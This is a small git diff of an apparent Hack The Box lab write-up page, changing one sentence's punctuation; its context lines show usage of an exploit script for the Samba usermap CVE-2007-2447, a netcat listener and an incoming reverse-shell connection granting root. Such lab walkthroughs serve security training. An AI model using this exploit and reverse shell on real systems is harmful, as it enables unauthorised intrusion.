@@ -69,7 +69,7 @@ At this moment, I have completed 17 HTB machines from the TJNull list and I am a
 <pre tabindex="0"><code>$ python2 usermap_script.py
 [*] CVE-2007-2447 - Samba usermap script
 [-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
-</code></pre><p>The script is very easy to use, and immediately provides us with <code>root</code> access to the box.</p>
+</code></pre><p>The script is very easy to use and immediately provides us with <code>root</code> access to the box.</p>
 <pre tabindex="0"><code>$ nc -lvnp 8008
 listening on [any] 8008 ...
 connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 41884
